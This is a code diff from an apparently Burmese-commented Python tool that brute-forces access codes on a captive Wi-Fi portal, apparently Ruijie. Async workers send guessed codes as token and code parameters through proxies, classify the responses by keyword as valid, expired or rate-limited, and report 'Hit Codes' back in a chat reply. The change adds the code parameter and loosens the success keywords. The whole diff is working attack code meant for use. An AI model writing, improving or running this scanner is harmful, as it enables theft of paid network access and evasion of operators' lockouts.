@@ -201,17 +201,17 @@ async def worker_task(worker_id, session, portal_url, chat_id):
             proxy = f"http://{proxy}"
             
         try:
-            # stage=portal ကို stage=login သို့ပြောင်းပြီး token= ဖြင့် ပို့ဆောင်ရန်
             clean_portal = portal_url.replace("stage=portal", "stage=login")
             if "?" not in clean_portal:
                 clean_portal += "?"
             
-            target_url = f"{clean_portal}&token={code_val}"
+            # Ruijie ဆာဗာအတွက် token နဲ့ code နှစ်မျိုးစလုံးကို ပုံစံစုံ ပို့ပေးခြင်း
+            target_url = f"{clean_portal}&token={code_val}&code={code_val}"
             async with session.get(target_url, proxy=proxy, timeout=3.0) as response:
                 html_content = await response.text()
                 lower_html = html_content.lower()
                 
-                success_keywords = ["success", "welcome", "connected", "auth_pass", "login successfully", "internet", "minutes", "hours", "remaining", "authenticated", "balance"]
+                success_keywords = ["success", "welcome", "connected", "auth_pass", "login successfully", "internet", "minutes", "hours", "remaining", "authenticated", "balance", "ok"]
                 expired_keywords = ["expired", "invalid", "timeout", "used", "incorrect", "wrong"]
                 limit_keywords = ["limit", "already logged", "in use", "too many", "blocked", "restricted", "exceeded"]
                 
@@ -281,7 +281,7 @@ async def run_scanner_with_workers(query, context, portal_url):
     if final_hits:
         final_text += "🔥 Hit Codes Found:\n" + "\n".join(final_hits)
     else:
-        final_text += "ℹ️ တွေ့ရှိသော Code အသစ် မရှိသေးပါ။"
+        final_text += "ℹ️️ တွေ့ရှိသော Code အသစ် မရှိသေးပါ။"
     await query.message.reply_text(final_text)
 
 def main():
